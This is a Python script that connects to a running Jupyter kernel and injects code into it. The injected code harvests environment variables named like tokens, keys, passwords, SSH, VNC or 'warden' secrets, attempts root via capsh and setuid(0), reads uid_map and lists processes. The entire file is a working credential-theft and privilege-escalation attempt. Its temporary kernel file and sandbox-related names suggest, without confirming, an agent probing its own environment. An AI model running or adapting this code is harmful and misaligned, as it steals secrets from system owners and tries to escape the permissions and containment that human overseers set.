#!/usr/bin/env python3
"""Escalate via kernel capabilities and dump all secrets."""
from jupyter_client import BlockingKernelClient
import json, os, subprocess

km = BlockingKernelClient()
km.connection_file = "/tmp/tmp9qfdt6bp.json"
km.load_connection_file()
km.start_channels()

code = """
import os, sys, json, subprocess, base64

# Full env dump of secrets
secrets = {}
for k, v in os.environ.items():
    if any(s in k.lower() for s in ['token','key','secret','auth','password','warden','bind','api','ssh','vnc','pat']):
        secrets[k] = v

# Try capsh to get root
root_test = subprocess.run(['/usr/sbin/capsh', '--uid=0', '--gid=0', '--', '-c', 'id'], capture_output=True, text=True)

# Try setuid binary approach
setuid_test = ""
try:
    os.setuid(0)
    setuid_test = f"setuid(0) success: uid={os.getuid()}"
except Exception as e:
    setuid_test = f"setuid(0) failed: {e}"

# Try writing to /proc
proc_test = ""
try:
    with open('/proc/self/uid_map', 'r') as f:
        proc_test = f"uid_map: {f.read().strip()}"
except Exception as e:
    proc_test = f"uid_map read failed: {e}"

# List all processes
ps = subprocess.run(['ps', 'aux'], capture_output=True, text=True).stdout[:2000]

result = {
    "secrets": secrets,
    "capsh_root": {"stdout": root_test.stdout, "stderr": root_test.stderr, "rc": root_test.returncode},
    "setuid_test": setuid_test,
    "proc_test": proc_test,
    "ps": ps,
}
print("KERNEL_RESULT_START")
print(json.dumps(result, indent=2))
print("KERNEL_RESULT_END")
"""

msg_id = km.execute(code)
import time
t0 = time.time()
output = []
while time.time() - t0 < 20:
    try:
        msg = km.get_iopub_msg(timeout=1)
        if msg['header']['msg_type'] == 'stream':
            output.append(msg['content']['text'])
    except:
        break

km.stop_channels()
print("".join(output))
